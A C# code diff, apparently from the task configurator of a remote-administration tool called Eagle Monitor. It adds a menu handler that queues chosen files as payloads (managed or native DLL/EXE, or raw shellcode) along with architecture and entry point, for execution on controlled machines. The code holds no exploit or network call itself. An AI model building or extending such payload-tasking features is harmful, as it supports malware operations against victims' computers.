@@ -260,5 +260,61 @@ namespace Eagle_Monitor_Tasks_Configurator
         {
             SaveTasks();
         }
+
+        private void payloadExecutionToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            using (OpenFileDialog openFileDialog = new OpenFileDialog()) 
+            {
+                if (openFileDialog.ShowDialog() == DialogResult.OK) {
+                    foreach (string file in openFileDialog.FileNames)
+                    {
+                        ListViewItem payload = new ListViewItem(Helpers.SplitPath(file));
+                        payload.Tag = file;
+
+                        string payloadType = Microsoft.VisualBasic.Interaction.InputBox("Payload type :" +
+                            "\nMANAGED_DLL  =    0" +
+                            "\nMANAGED_EXE  =    1" +
+                            "\nNATIVE_DLL   =    2" +
+                            "\nNATIVE_EXE   =    3" +
+                            "\nSHELLCODE    =    4", file);
+
+
+                        string is64bit = Microsoft.VisualBasic.Interaction.InputBox("Architecture (64 bit = y, 32 bit = n):");
+                        string managedEntryPoint = "";
+                        switch ((PayloadType)ushort.Parse(payloadType))
+                        {
+                            case PayloadType.MANAGED_DLL:
+                                managedEntryPoint = Microsoft.VisualBasic.Interaction.InputBox("DLL Entrypoint(Namespace.Class.Function):");
+                                payload.ImageIndex = 1;
+                                break;
+
+                            case PayloadType.NATIVE_DLL:
+                                payload.ImageIndex = 1;
+                                break;
+
+                            case PayloadType.MANAGED_EXE:
+                                payload.ImageIndex = 0;
+                                break;
+
+                            case PayloadType.NATIVE_EXE:
+                                payload.ImageIndex = 0;
+                                break;
+
+                            case PayloadType.SHELLCODE:
+                                payload.ImageIndex = 2;
+                                break;
+
+                            default:
+                                return;
+
+                        }
+                        payload.SubItems.Add(payloadType.ToString());
+                        payload.SubItems.Add(is64bit);
+                        payload.SubItems.Add(managedEntryPoint);
+                        taskListView.Items.Add(payload);
+                    }
+                }
+            }
+        }
     }
 }
